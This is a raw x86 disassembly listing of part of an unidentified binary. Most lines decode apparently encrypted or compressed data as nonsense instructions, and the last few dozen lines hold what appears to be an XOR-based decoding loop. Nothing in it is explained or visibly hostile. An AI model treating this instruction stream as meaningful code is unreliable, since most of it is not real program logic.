  40306f:	jge    0x40306e
  403071:	inc    edx
  403072:	sbb    dh,BYTE PTR [ebx]
  403074:	(bad)  [edi-0x6161487c]
  40307a:	sbb    bh,BYTE PTR [esi+0x7e]
  40307d:	xor    BYTE PTR [ecx+0x7e],0x7e
  403081:	sbb    esp,0xffffffbc
  403084:	std    
  403085:	fucomi st,st(1)
  403087:	rcl    eax,1
  403089:	popf   
  40308a:	sub    edi,DWORD PTR [eax]
  40308c:	push   ss
  40308d:	arpl   WORD PTR ds:0xd5ab6860,bp
  403093:	inc    ebx
  403094:	in     al,0x67
  403096:	fistp  WORD PTR [ebx-0x38]
  403099:	dec    ebx
  40309a:	ret    0xc3cf
  40309d:	add    ebp,DWORD PTR [ebx+0x3e]
  4030a0:	js     0x4030ce
  4030a2:	clc    
  4030a3:	dec    ecx
  4030a4:	push   eax
  4030a5:	shl    DWORD PTR [eax-0x2],1
  4030a8:	stos   DWORD PTR es:[edi],eax
  4030a9:	xchg   ch,bh
  4030ab:	mov    ah,0x98
  4030ad:	js     0x40304b
  4030af:	add    edi,0x15
  4030b2:	std    
  4030b3:	jno    0x40305c
  4030b5:	sbb    al,0x85
  4030b7:	and    al,0xc2
  4030b9:	xor    BYTE PTR [edi+0x2f1f9055],bh
  4030bf:	dec    esp
  4030c0:	cmp    BYTE PTR [ecx+0x596f5cb7],bl
  4030c6:	mov    ebx,0xe332de2e
  4030cb:	or     al,0x4
  4030cd:	mov    gs:0x669640c7,al
  4030d3:	ds inc edx
  4030d5:	leave  
  4030d6:	push   cs
  4030d7:	push   edx
  4030d8:	cmp    eax,0xa741ba17
  4030dd:	repnz div DWORD PTR [edi+ebp*8-0x224cfe99]
  4030e5:	mov    cl,0x2a
  4030e7:	ja     0x403163
  4030e9:	mov    ah,0x41
  4030eb:	test   eax,0x925c120b
  4030f0:	rcr    DWORD PTR [eax+0xd501e7d],0x83
  4030f7:	(bad)  
  4030f8:	xchg   esi,eax
  4030f9:	stc    
  4030fa:	inc    eax
  4030fb:	scas   eax,DWORD PTR es:[edi]
  4030fc:	lds    edi,FWORD PTR [edx-0x5b3bd0f7]
  403102:	pop    edi
  403103:	cli    
  403104:	ja     0x40313c
  403106:	int    0xa8
  403108:	icebp  
  403109:	mov    al,ds:0x6729ccc5
  40310e:	xchg   DWORD PTR [esi-0x16e4a8e3],edi
  403114:	mov    ss,esp
  403116:	call   0x9e4d152f
  40311b:	inc    eax
  40311c:	and    BYTE PTR [eax-0x48],ch
  40311f:	lods   eax,DWORD PTR ds:[esi]
  403120:	loopne 0x4030b1
  403122:	jg     0x4030c2
  403124:	cmp    ch,ah
  403126:	mov    BYTE PTR [edx-0x12],0x9a
  40312a:	sti    
  40312b:	sbb    al,0x49
  40312d:	test   al,0x88
  40312f:	repnz adc DWORD PTR fs:[eax-0x64],0x4189e6ab
  403138:	daa    
  403139:	div    BYTE PTR [edi+eiz*4+0x7700de2b]
  403140:	ret    
  403141:	and    BYTE PTR [edi-0xaad1e1b],ch
  403147:	xchg   edx,eax
  403148:	sti    
  403149:	add    esi,0xe8024072
  40314f:	fmulp  st(0),st
  403151:	xbegin 0x10c312ee
  403157:	and    DWORD PTR [eax],ebp
  403159:	ret    0x4589
  40315c:	sar    DWORD PTR [eax],0x54
  40315f:	push   es
  403160:	fs ret 0x75db
  403164:	and    dh,ah
  403166:	push   cs
  403167:	dec    ebx
  403168:	idiv   BYTE PTR [edx-0x3a]
  40316b:	or     al,0xc2
  40316d:	mov    esp,es
  40316f:	push   ebp
  403170:	ficom  WORD PTR [ebx-0x54]
  403173:	aam    0x76
  403175:	cdq    
  403176:	add    DWORD PTR [eax+0xf],eax
  403179:	clc    
  40317a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40317b:	call   0x6986aa12
  403180:	and    eax,0x5c61e0a4
  403185:	or     ebx,DWORD PTR [edi]
  403187:	and    bl,BYTE PTR [eax-0x23]
  40318a:	test   eax,0x96f59dc2
  40318f:	add    dl,bh
  403191:	push   ebx
  403192:	enter  0x359d,0xd3
  403196:	jmp    0x40320f
  403198:	ds pop esp
  40319a:	xor    dh,BYTE PTR [ebp-0x302bd8f4]
  4031a0:	outs   dx,DWORD PTR ds:[esi]
  4031a1:	aad    0xf3
  4031a3:	popa   
  4031a4:	sub    eax,0x943b71dd
  4031a9:	enter  0x6779,0x60
  4031ad:	adc    DWORD PTR [ebx+esi*2],ebp
  4031b0:	lea    ebx,[edx]
  4031b2:	mov    ebp,0x48502bd6
  4031b7:	add    dh,al
  4031b9:	jg     0x4031dd
  4031bb:	fistp  DWORD PTR [esi-0x16ba743c]
  4031c1:	cld    
  4031c2:	cs (bad) 
  4031c4:	stc    
  4031c5:	(bad)  
  4031c6:	ror    BYTE PTR [esi],cl
  4031c8:	xor    DWORD PTR [edi-0x5b],edx
  4031cb:	out    0xac,al
  4031cd:	imul   ebp,DWORD PTR [ecx+0x715d3e90],0x9a97458
  4031d7:	lods   al,BYTE PTR ds:[esi]
  4031d8:	jmp    0x4471:0xf10af562
  4031df:	sub    DWORD PTR [eax-0x4bc6f5e4],edi
  4031e5:	sbb    DWORD PTR [edi],edx
  4031e7:	push   edi
  4031e8:	xchg   edi,eax
  4031e9:	imul   edx,DWORD PTR ds:0xde3c3c96,0xd998972e
  4031f3:	rol    DWORD PTR [edi-0x27f057b9],1
  4031f9:	(bad)  [eax-0x6ff22e72]
  4031ff:	loopne 0x403263
  403201:	cmp    bl,BYTE PTR [eax]
  403203:	jns    0x403207
  403205:	rol    BYTE PTR [edi],0xca
  403208:	push   ebp
  403209:	pop    es
  40320a:	sbb    al,0x72
  40320c:	inc    esi
  40320d:	je     0x40327c
  40320f:	and    BYTE PTR [ebx],al
  403211:	imul   esp,DWORD PTR [ebp+0x70],0xffffffa7
  403215:	idiv   BYTE PTR [edi+ecx*4]
  403218:	repz popf 
  40321a:	mov    cl,0xa
  40321c:	mov    bl,0x5e
  40321e:	fsub   QWORD PTR [eax-0x5625dca2]
  403224:	pop    ebx
  403225:	ins    BYTE PTR es:[edi],dx
  403226:	jb     0x40321e
  403228:	or     al,BYTE PTR [ebp+ebx*8-0x8]
  40322c:	in     eax,dx
  40322d:	stc    
  40322e:	push   eax
  40322f:	scas   eax,DWORD PTR es:[edi]
  403230:	(bad)  
  403231:	std    
  403232:	push   eax
  403233:	ss int 0x19
  403236:	and    BYTE PTR [esi+0x51],ch
  403239:	jne    0x4031f7
  40323b:	add    DWORD PTR [ebx],0xfffffffd
  40323e:	sbb    DWORD PTR [ebx-0x44a5eb14],0xffffff87
  403245:	sub    al,BYTE PTR [eax+edi*4-0x4b]
  403249:	call   0xec2d:0xdb2aa9fa
  403250:	pop    esi
  403251:	das    
  403252:	sbb    ebx,DWORD PTR ds:0x934390dd
  403258:	xchg   ebp,eax
  403259:	aam    0x60
  40325b:	inc    edi
  40325c:	add    BYTE PTR [eax-0x1dfe1ddb],cl
  403262:	mov    ecx,0x71401eec
  403267:	add    dl,bl
  403269:	into   
  40326a:	test   DWORD PTR [ecx],esi
  40326c:	lock xor ebx,DWORD PTR [edx+esi*4+0x537c6131]
  403274:	pop    ds
  403275:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403276:	add    DWORD PTR [edi-0x1f],0xfffffffa
  40327a:	daa    
  40327b:	outs   dx,DWORD PTR ds:[esi]
  40327c:	xchg   esi,eax
  40327d:	popa   
  40327e:	lock lahf 
  403280:	add    ch,BYTE PTR gs:[eax+0x146518a]
  403287:	jmp    0x698d:0xbcecd34b
  40328e:	retf   
  40328f:	iret   
  403290:	sbb    BYTE PTR [ecx+0x3f],0x61
  403294:	mov    al,0x1
  403296:	std    
  403297:	in     al,dx
  403298:	daa    
  403299:	pusha  
  40329a:	push   ecx
  40329b:	mov    esp,0x14745184
  4032a0:	push   eax
  4032a1:	imul   ebp,DWORD PTR ds:0xf2009f9f,0x5a06ce27
  4032ab:	add    DWORD PTR [eax*2-0x369767b7],0x2c
  4032b3:	ret    0x555a
  4032b6:	stos   BYTE PTR es:[edi],al
  4032b7:	shr    BYTE PTR [ecx+esi*1],1
  4032ba:	ffree  st(0)
  4032bc:	les    eax,FWORD PTR [ebp-0x2a]
  4032bf:	or     DWORD PTR [ecx],ecx
  4032c1:	(bad)  
  4032c2:	call   0x3e83:0xf6feccc8
  4032c9:	sbb    BYTE PTR [ebp+0xb87571c],al
  4032cf:	retf   
  4032d0:	fiadd  WORD PTR ss:0x25f3627e
  4032d7:	dec    eax
  4032d8:	scas   eax,DWORD PTR es:[edi]
  4032d9:	ret    
  4032da:	and    dh,BYTE PTR [edi]
  4032dc:	sbb    ah,BYTE PTR [esi+eax*2]
  4032df:	ins    DWORD PTR es:[edi],dx
  4032e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032e1:	sbb    al,0x51
  4032e3:	push   ecx
  4032e4:	(bad)  
  4032e5:	scas   al,BYTE PTR es:[edi]
  4032e6:	cli    
  4032e7:	hlt    
  4032e8:	inc    ebp
  4032e9:	test   BYTE PTR [ebx],ah
  4032eb:	lds    edx,FWORD PTR [edx]
  4032ed:	inc    esi
  4032ee:	int    0x33
  4032f0:	das    
  4032f1:	ret    
  4032f2:	inc    ecx
  4032f3:	push   cs
  4032f4:	cmp    eax,0x6d68107a
  4032f9:	mov    WORD PTR [esi],ss
  4032fb:	add    BYTE PTR [ecx+ebp*4+0x5d],dh
  4032ff:	sbb    al,0xdd
  403301:	mov    esp,0x7545aed3
  403306:	stos   BYTE PTR es:[edi],al
  403307:	jmp    0x196ac8c2
  40330c:	ficom  DWORD PTR [edi+0x7197a3d3]
  403312:	mov    al,ds:0xeae5527
  403317:	fs jnp 0x403333
  40331a:	push   es
  40331b:	mov    esp,ebx
  40331d:	mov    esp,edi
  40331f:	add    DWORD PTR [edi-0x61],ebx
  403322:	icebp  
  403323:	cmp    ecx,edx
  403325:	gs fwait
  403327:	and    BYTE PTR [esi-0x65],bh
  40332a:	xchg   esp,eax
  40332b:	adc    eax,0x9f45ab2a
  403330:	pusha  
  403331:	fcmove st,st(5)
  403333:	lods   eax,DWORD PTR ds:[esi]
  403334:	push   DWORD PTR [esp+edx*2+0xd8d41c8]
  40333b:	adc    al,0xe3
  40333d:	fmulp  st(6),st
  40333f:	daa    
  403340:	inc    ebx
  403341:	adc    cl,al
  403343:	pop    ebp
  403344:	push   edi
  403345:	cs inc ecx
  403347:	xchg   edi,eax
  403348:	dec    DWORD PTR [edx-0x286b6899]
  40334e:	cmp    bl,BYTE PTR [eax-0x54]
  403351:	mov    edx,0x3ae5e18a
  403356:	adc    al,0x48
  403358:	sbb    ecx,ebp
  40335a:	push   esi
  40335b:	jge    0x40332a
  40335d:	push   es
  40335e:	push   ss
  40335f:	or     al,0x36
  403361:	sti    
  403362:	push   ebx
  403363:	xchg   edi,eax
  403364:	mov    eax,0x98276ea6
  403369:	imul   esi,DWORD PTR es:[esi],0xffffff8f
  40336d:	mov    WORD PTR [ecx],es
  40336f:	mov    dh,0x1d
  403371:	and    BYTE PTR [edx-0x6b27b171],bl
  403377:	sti    
  403378:	hlt    
  403379:	out    0x8a,al
  40337b:	out    0xca,al
  40337d:	test   BYTE PTR [edi+0x2cbcc50b],0xd6
  403384:	lahf   
  403385:	jge    0x4033e7
  403387:	loopne 0x40335c
  403389:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40338a:	mov    BYTE PTR [edx],al
  40338c:	pushf  
  40338d:	mov    ds:0xfb1bb6f1,eax
  403392:	cmp    eax,0xe7864163
  403397:	push   0xffffff88
  403399:	mov    bh,0x27
  40339b:	inc    ebp
  40339c:	cdq    
  40339d:	sub    BYTE PTR [edi-0x5e624c4],al
  4033a3:	fisubr WORD PTR [esi+0x66]
  4033a6:	sti    
  4033a7:	aad    0xcb
  4033a9:	pop    es
  4033aa:	xlat   BYTE PTR ds:[ebx]
  4033ab:	jl     0x403420
  4033ad:	and    eax,0x7a05e1af
  4033b2:	aaa    
  4033b3:	jb     0x403340
  4033b5:	(bad)  
  4033b6:	jmp    0x5aa9aaba
  4033bb:	mov    ss,WORD PTR [ebx-0x78]
  4033be:	jge    0x40339a
  4033c0:	stos   BYTE PTR es:[edi],al
  4033c1:	nop
  4033c2:	sub    bl,BYTE PTR [esi+ebx*8-0x1a]
  4033c6:	push   esi
  4033c7:	or     esi,DWORD PTR [ebx]
  4033c9:	les    edx,FWORD PTR [ebp+0x69]
  4033cc:	sti    
  4033cd:	push   ds
  4033ce:	sbb    DWORD PTR ds:0x2d4f97e9,ebp
  4033d4:	adc    ebp,edi
  4033d6:	pop    es
  4033d7:	or     eax,0xedb18c11
  4033dc:	int3   
  4033dd:	outs   dx,DWORD PTR ds:[esi]
  4033de:	in     eax,0xc1
  4033e0:	test   ebp,ebp
  4033e2:	fidiv  WORD PTR [edx+eax*8-0x52]
  4033e6:	dec    esi
  4033e7:	fistp  WORD PTR [edi-0x30]
  4033ea:	aad    0xff
  4033ec:	sbb    al,0x84
  4033ee:	xchg   esp,eax
  4033ef:	xor    eax,0x18f15081
  4033f4:	and    DWORD PTR [ecx-0x30],0xffffff8c
  4033f8:	popa   
  4033f9:	pop    ebp
  4033fa:	inc    ebx
  4033fb:	sbb    eax,DWORD PTR [ecx-0x64fa9cc9]
  403401:	and    dl,dh
  403403:	jp     0x4033d6
  403405:	and    edx,DWORD PTR [ecx-0x68fffe97]
  40340b:	repz shl DWORD PTR [eax],0xa
  40340f:	es loopne 0x4033a5
  403412:	test   DWORD PTR [ebp-0x1b],ecx
  403415:	mov    edi,DWORD PTR [ebp+0x8]
  403418:	mov    edi,DWORD PTR [edi]
  40341a:	mov    edx,0x8a40
  40341f:	xor    ax,dx
  403422:	jmp    0x4037d3
  403427:	nop
  403428:	cdq    
  403429:	fst    QWORD PTR [ecx-0x6683aa03]
  40342f:	xlat   BYTE PTR ds:[ebx]
  403430:	push   cs
  403431:	mov    cl,0xfe
  403433:	sar    DWORD PTR [ebx],1
  403435:	adc    eax,0x7e1e229b
  40343a:	jle    0x4033be
  40343c:	jno    0x4034bc
  40343e:	jle    0x40342d
  403440:	repnz sub al,0xdf
  403443:	ins    DWORD PTR es:[edi],dx
  403444:	or     BYTE PTR [edx],0xe3
  403447:	adc    eax,0x317d38ed
  40344c:	jmp    0x921b:0xaf8abd8
  403453:	cmp    eax,0x6b10282b
  403458:	sbb    BYTE PTR [ebx],0x14
  40345b:	retf   0x8393
  40345e:	adc    eax,0x6f4b2f4e
  403463:	in     al,dx
  403464:	ins    DWORD PTR es:[edi],dx
  403465:	sub    eax,0x3aa83272
  40346a:	retf   
  40346b:	push   0x95c44d8d
  403470:	jmp    0x43fe4ff
  403475:	mov    ds:0x2a275c63,al
  40347a:	stc    
  40347b:	out    dx,eax
  40347c:	dec    ecx
  40347d:	retf   
  40347e:	stos   BYTE PTR es:[edi],al
  40347f:	fisubr DWORD PTR ds:[edx+0x4568cd2d]
  403486:	jnp    0x40346c
  403488:	cli    
  403489:	xchg   DWORD PTR [ecx+eax*4-0x4b34e46d],edx
  403490:	cdq    
  403491:	dec    eax
  403492:	or     DWORD PTR [eax+0x5860de1],edi
  403498:	pop    esi
  403499:	cld    
  40349a:	jb     0x4034b9
  40349c:	fimul  DWORD PTR [edx+0x43]
  40349f:	es push ds
  4034a1:	jge    0x403500
  4034a3:	pop    ss
  4034a4:	inc    eax
  4034a5:	dec    esi
  4034a6:	add    edi,ebp
  4034a8:	dec    eax
  4034a9:	popf   
  4034aa:	outs   dx,DWORD PTR ds:[esi]
  4034ab:	loop   0x4034b7
  4034ad:	test   BYTE PTR [eax+0x75adbe23],bh
  4034b3:	(bad)  
  4034b4:	aas    
  4034b5:	jmp    0x40348a
  4034b7:	jae    0x403441
  4034b9:	mov    ah,0x6e
  4034bb:	mov    edi,0x71225741
  4034c0:	clc    
  4034c1:	pop    edx
  4034c2:	fs je  0x403479
  4034c5:	test   al,0x2a
  4034c7:	xlat   BYTE PTR ds:[ebx]
  4034c8:	repz sbb BYTE PTR [ebx],0x77
  4034cc:	adc    al,0xfa
  4034ce:	js     0x403481
  4034d0:	inc    edi
  4034d1:	sahf   
  4034d2:	push   ss
  4034d3:	or     DWORD PTR [esi+0x72307327],esp
  4034d9:	jmp    0x403492
  4034db:	arpl   WORD PTR [edi+0x21],di
  4034de:	inc    esp
  4034df:	pop    ss
  4034e0:	fidiv  DWORD PTR gs:[eax+edi*1+0xd]
  4034e5:	push   edx
  4034e6:	pop    ebx
  4034e7:	mov    ds:0x7a8c848f,eax
  4034ec:	mov    ebx,0x5475d766
  4034f1:	loopne 0x403520
  4034f3:	cs adc cl,ah
  4034f6:	das    
  4034f7:	add    DWORD PTR [esi],ebx
  4034f9:	xor    ebx,DWORD PTR [ecx]
  4034fb:	cmp    al,0xb8
  4034fd:	xchg   ebp,eax
  4034fe:	mov    WORD PTR [esi],ss
  403500:	pop    ebx
  403501:	je     0x40352b
  403503:	stos   BYTE PTR es:[edi],al
  403504:	mov    bh,0xb9
  403506:	jge    0x4034b7
  403508:	aas    
  403509:	dec    edi
  40350a:	scas   al,BYTE PTR es:[edi]
  40350b:	arpl   WORD PTR [ecx+0x40],bx
  40350e:	inc    edi
  40350f:	pop    ss
  403510:	cmp    bl,dh
  403512:	push   ds
  403513:	stos   BYTE PTR es:[edi],al
  403514:	test   eax,0x30c5f285
  403519:	mov    WORD PTR [edx+0x36d34d54],?
  40351f:	lock push ebx
  403521:	inc    ecx
  403522:	mov    bl,0xc1
  403524:	outs   dx,DWORD PTR ds:[esi]
  403525:	clc    
  403526:	or     BYTE PTR [edi-0x6d],cl
  403529:	scas   al,BYTE PTR es:[edi]
  40352a:	mov    ds:0xb6d0bc21,eax
  40352f:	ins    BYTE PTR es:[edi],dx
  403530:	enter  0x12d1,0x55
  403534:	sub    ch,BYTE PTR [esi+eiz*1-0x75a6558b]
  40353b:	icebp  
  40353c:	fcmovbe st,st(0)
  40353e:	cwde   
  40353f:	inc    edi
  403540:	lock neg DWORD PTR [esi]
  403543:	ins    BYTE PTR es:[edi],dx
  403544:	(bad)  
  403545:	or     eax,0x4e0285cf
  40354a:	jno    0x4034f9
  40354c:	xor    edx,DWORD PTR [ebp+esi*8+0x666b2d93]
  403553:	stos   BYTE PTR es:[edi],al
  403554:	xchg   DWORD PTR [ecx],esp
  403556:	sbb    eax,0x2a890bd6
  40355b:	or     bl,BYTE PTR [ecx-0x1de9f69b]
  403561:	xor    dl,BYTE PTR [esi]
  403563:	adc    esi,DWORD PTR [eax]
  403565:	cli    
  403566:	fmul   QWORD PTR [edx-0x6ec8b80d]
  40356c:	and    al,0x63
  40356e:	lahf   
  40356f:	add    al,0x70
  403571:	sbb    edx,ecx
  403573:	xor    BYTE PTR [edx+0x11],0xb5
  403577:	ds pop es
  403579:	and    al,0xf4
  40357b:	adc    eax,0xc61dc885
  403580:	xchg   ecx,eax
  403581:	mov    ebx,DWORD PTR [edi]
  403583:	add    dl,BYTE PTR ds:0x90254fa1
  403589:	into   
  40358a:	sub    BYTE PTR ds:0x79c48364,0xf0
  403591:	pop    esi
  403592:	lock mov al,ds:0xd207d2ba
  403598:	aaa    
  403599:	lea    ebp,ds:0x50c229ec
  40359f:	push   edx
  4035a0:	pop    ebx
  4035a1:	and    eax,0x7c
  4035a4:	int3   
  4035a5:	das    
  4035a6:	stc    
  4035a7:	fsub   DWORD PTR [ecx]
  4035a9:	or     DWORD PTR [ebx+0x5],ebp
  4035ac:	mov    ch,0xd4
  4035ae:	cmp    edx,DWORD PTR [ecx+0x1527f13a]
  4035b4:	(bad)  
  4035b6:	inc    esi
  4035b7:	jecxz  0x403594
  4035b9:	adc    eax,0x808efc40
  4035be:	out    0x3f,al
  4035c0:	stos   BYTE PTR es:[edi],al
  4035c1:	enter  0x8682,0xbe
  4035c5:	mov    ?,ecx
  4035c7:	xchg   al,ah
  4035c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035ca:	ret    
  4035cb:	inc    eax
  4035cc:	mov    ah,0xdb
  4035ce:	jge    0x403555
  4035d0:	test   eax,0xcb6f6af0
  4035d5:	jnp    0x403655
  4035d7:	and    ah,bl
  4035d9:	adc    al,0x72
  4035db:	ins    DWORD PTR es:[edi],dx
  4035dc:	sbb    ch,ch
  4035de:	ins    BYTE PTR es:[edi],dx
  4035df:	mov    DWORD PTR [eax],0x8f613dab
  4035e5:	out    0x7a,eax
  4035e7:	gs stc 
  4035e9:	cmp    edi,eax
  4035eb:	clc    
  4035ec:	loopne 0x4035ac
  4035ee:	cli    
  4035ef:	out    0x6e,al
  4035f1:	mov    edi,eax
  4035f3:	pop    ebp
  4035f4:	gs cmp al,cl
  4035f7:	ret    
  4035f8:	test   BYTE PTR [ebx],ch
  4035fa:	xor    ah,dl
  4035fc:	mov    al,ds:0x147af62b
  403601:	jmp    DWORD PTR gs:[edx+0x2764ee96]
  403608:	ja     0x4035b3
  40360a:	enter  0x9994,0xd
  40360e:	jns    0x4035e7
  403610:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403611:	test   al,0x2b
  403613:	aad    0xd9
  403615:	xchg   edx,eax
  403616:	call   0xdff6:0x3e63bde
  40361d:	fcom   DWORD PTR [edi]
  40361f:	call   0x3acd7f81
  403624:	scas   eax,DWORD PTR es:[edi]
  403625:	sbb    dh,ah
  403627:	scas   eax,DWORD PTR es:[edi]
  403628:	jmp    0xefa2:0x9097b6be
  40362f:	(bad)  
  403630:	mov    ah,0xe1
  403632:	xor    ecx,DWORD PTR [esi]
  403634:	gs push eax
  403636:	ss (bad) 
  403638:	sub    ebx,DWORD PTR [ebp+0x460c8a48]
  40363e:	das    
  40363f:	stc    
  403640:	retf   0x57
  403643:	mov    ah,0xb7
  403645:	pop    ds
  403646:	push   es
  403647:	nop
  403648:	scas   al,BYTE PTR es:[edi]
  403649:	inc    eax
  40364a:	xchg   edi,eax
  40364b:	idiv   al
  40364d:	push   edi
  40364e:	clc    
  40364f:	retf   
  403650:	std    
  403651:	in     al,dx
  403652:	mov    al,ds:0xa15c29ed
  403657:	call   0x14a:0xcfb7003e
  40365e:	stos   BYTE PTR es:[edi],al
  40365f:	and    al,BYTE PTR [ebx-0x12bdadec]
  403665:	enter  0x636f,0x7d
  403669:	xor    BYTE PTR [esi],dh
  40366b:	xor    BYTE PTR [ecx+esi*1-0x4e42b260],ch
  403672:	mov    ecx,0x189969b
  403677:	dec    BYTE PTR [ecx]
  403679:	jmp    DWORD PTR [ecx-0x36]
  40367c:	xchg   DWORD PTR [esi-0x47],esp
  40367f:	mov    bh,0x1c
  403681:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403682:	ins    DWORD PTR es:[edi],dx
  403683:	push   edi
  403684:	add    edx,DWORD PTR [edx]
  403686:	pmulhuw mm3,mm1
  403689:	push   ds
  40368a:	mov    edi,0x683c7849
  40368f:	loop   0x40362c
  403691:	pop    ebx
  403692:	xor    DWORD PTR [ecx-0x4a],ebx
  403695:	outs   dx,BYTE PTR ds:[esi]
  403696:	popf   
  403697:	in     al,0x4d
  403699:	or     BYTE PTR [ebp-0x125da5fa],0xf8
  4036a0:	pop    es
  4036a1:	push   es
  4036a2:	imul   ebp,DWORD PTR [edx],0xfffffff9
  4036a5:	inc    edi
  4036a6:	mov    BYTE PTR ds:0xca59e4f4,ah
  4036ac:	lods   eax,DWORD PTR ds:[esi]
  4036ad:	(bad)  
  4036ae:	or     BYTE PTR [edi],bh
  4036b0:	mov    esp,DWORD PTR [eax]
  4036b2:	sbb    dl,bh
  4036b4:	push   es
  4036b5:	in     al,0xfd
  4036b7:	add    eax,0xe9a74d4c
  4036bc:	popf   
  4036bd:	or     eax,edx
  4036bf:	push   ecx
  4036c0:	adc    eax,0xd6df7a43
  4036c5:	ss stos DWORD PTR es:[edi],eax
  4036c7:	sbb    esi,edi
  4036c9:	stc    
  4036ca:	pop    esi
  4036cb:	ror    BYTE PTR [edi],0xa9
  4036ce:	adc    DWORD PTR [edi+eiz*4],ecx
  4036d1:	mov    eax,ds:0x4c746c19
  4036d6:	fdiv   st(4),st
  4036d8:	sub    bh,cl
  4036da:	mov    edi,0x93096376
  4036df:	dec    eax
  4036e0:	or     al,0x76
  4036e2:	aas    
  4036e3:	inc    ebp
  4036e4:	xor    ah,BYTE PTR [eax]
  4036e6:	sahf   
  4036e7:	add    cl,dh
  4036e9:	xchg   DWORD PTR [ebx+0x5557db67],ebx
  4036ef:	jmp    0xf998e6b1
  4036f4:	cmp    esi,DWORD PTR [ecx+0x54403283]
  4036fa:	add    al,0x46
  4036fc:	dec    edi
  4036fd:	pop    esp
  4036fe:	add    eax,0x1d7b523
  403703:	je     0x40369a
  403705:	out    0x22,al
  403707:	push   cs
  403708:	mov    dh,0x5a
  40370a:	ins    DWORD PTR es:[edi],dx
  40370b:	mov    bh,0x99
  40370d:	cmp    al,BYTE PTR [ebx+0x2ef30f29]
  403713:	add    eax,0xce795b58
  403718:	mov    BYTE PTR [ebp-0x4d3bced8],cl
  40371e:	in     eax,0xac
  403720:	cwde   
  403721:	jne    0x40376e
  403723:	adc    ecx,0x15
  403726:	xor    dl,al
  403728:	dec    ebp
  403729:	fisttp QWORD PTR [edi]
  40372b:	out    0x6f,eax
  40372d:	sub    al,0x19
  40372f:	push   ss
  403730:	add    ebx,DWORD PTR [edi-0x5c3a2de3]
  403736:	xchg   edi,eax
  403737:	pop    edi
  403738:	mov    ds:0x327f835d,eax
  40373d:	repnz lock or eax,0x1bf70fd2
  403744:	xchg   ebx,eax
  403745:	xor    bh,BYTE PTR [esi-0x706e8118]
  40374b:	jmp    FWORD PTR [ecx+ebp*2+0x59]
  40374f:	daa    
  403750:	jno    0x4037a5
  403752:	pop    ebp
  403753:	shl    BYTE PTR es:[ebx+0x3b],cl
  403757:	or     al,0x15
  403759:	adc    BYTE PTR [esi],al
  40375b:	cmc    
  40375c:	add    BYTE PTR [ebx],ah
  40375e:	loope  0x403744
  403760:	or     ebp,edi
  403762:	add    BYTE PTR [ebp+0x5d014616],dh
  403768:	add    eax,0x25704c72
  40376d:	inc    edx
  40376e:	ret    0x7914
  403771:	pop    edi
  403772:	int3   
  403773:	in     al,dx
  403774:	push   ss
  403775:	add    eax,0x5438e703
  40377a:	mov    dh,0xb
  40377c:	sar    DWORD PTR [ebp-0x7f45562a],cl
  403782:	addr16 jns 0x40377e
  403785:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403786:	(bad)  
  403787:	outs   dx,DWORD PTR ds:[esi]
  403788:	fdivr  QWORD PTR [ecx]
  40378b:	mov    ds:0x5dba6d1d,eax
  403790:	enter  0xc3db,0xf9
  403794:	mov    ecx,0x1b146d58
  403799:	pop    ecx
  40379a:	in     eax,0x34
  40379c:	mov    esp,0xb1064685
  4037a1:	loope  0x4037c6
  4037a3:	aad    0x48
  4037a5:	(bad)  
  4037a6:	sub    eax,0xb967ef79
  4037ab:	in     al,0xf8
  4037ad:	dec    ebx
  4037ae:	shl    DWORD PTR [esp+ecx*4-0x6733faaa],0x5d
  4037b6:	loope  0x403798
  4037b8:	mov    ch,0xb1
  4037ba:	ret    
  4037bb:	daa    
  4037bc:	sbb    ebx,ebx
  4037be:	mov    ds:0x24638c93,eax
  4037c3:	jecxz  0x403841
  4037c5:	(bad)  
  4037c6:	jnp    0x4037b3
  4037c8:	add    BYTE PTR [ebp+0x2],dh
  4037cb:	xchg   edx,eax
  4037cc:	aaa    
  4037cd:	dec    ebp
  4037ce:	xchg   edi,eax
  4037cf:	dec    esi
  4037d0:	cmc    
  4037d1:	xchg   esi,eax
  4037d2:	enter  0x6ba,0x3b
  4037d6:	add    BYTE PTR [eax],al
  4037d8:	add    ax,dx
  4037db:	cmp    ax,WORD PTR [edi]
  4037de:	je     0x40382b
  4037e4:	mov    eax,DWORD PTR [ebp-0x14]
  4037e7:	xor    eax,ecx
  4037e9:	add    eax,esi
  4037eb:	mov    DWORD PTR [ebp-0x24],eax
  4037ee:	mov    eax,DWORD PTR [ebp-0x28]
  4037f1:	mov    di,WORD PTR [ebp-0x2c]
  4037f5:	mov    ebx,0x8a40
  4037fa:	xor    di,bx
  4037fd:	add    di,dx
  403800:	movzx  edx,di
  403803:	mov    edi,DWORD PTR [ebp-0x8]
  403806:	xor    edi,ecx
  403808:	lea    edx,[edx+edi*1+0x32729d]
  40380f:	add    DWORD PTR [eax],edx
  403811:	mov    eax,DWORD PTR [ebp-0x20]
  403814:	mov    edx,DWORD PTR [ebp-0x8]
  403817:	mov    edi,DWORD PTR [ebp-0x24]
  40381a:	xor    edx,ecx
  40381c:	add    edx,esi
  40381e:	imul   edx,edi
  403821:	sub    DWORD PTR [eax],edx
  403823:	mov    eax,DWORD PTR [ebp-0x14]
  403826:	jmp    0x4028b3
  40382b:	mov    eax,DWORD PTR [ebp-0xc]
  40382e:	mov    edx,DWORD PTR [ebp-0x18]
  403831:	xor    eax,edx
  403833:	cmp    eax,0x7aa80c5f
  403838:	je     0x402858
  40383e:	mov    eax,DWORD PTR [ebp-0x10]
  403841:	add    DWORD PTR [eax],0x7403501
  403847:	jmp    0x402858
  40384c:	mov    eax,DWORD PTR [ebp-0x1c]
  40384f:	cmp    DWORD PTR [eax],edi
  403851:	je     0x402858
  403857:	mov    eax,0x800f1c9a
  40385c:	jmp    0x4028b7
  403861:	push   ebp
  403862:	mov    ebp,esp
  403864:	sub    esp,0x44
  403867:	push   edi
  403868:	mov    eax,DWORD PTR [ebp+0xc]
  40386b:	and    DWORD PTR ds:0x4304a6,0x265f
  403875:	mov    DWORD PTR [ebp-0x10],eax
  403878:	mov    eax,DWORD PTR [ebp+0x8]
  40387b:	and    DWORD PTR ds:0x42e766,0x0
  403885:	jmp    0x403899
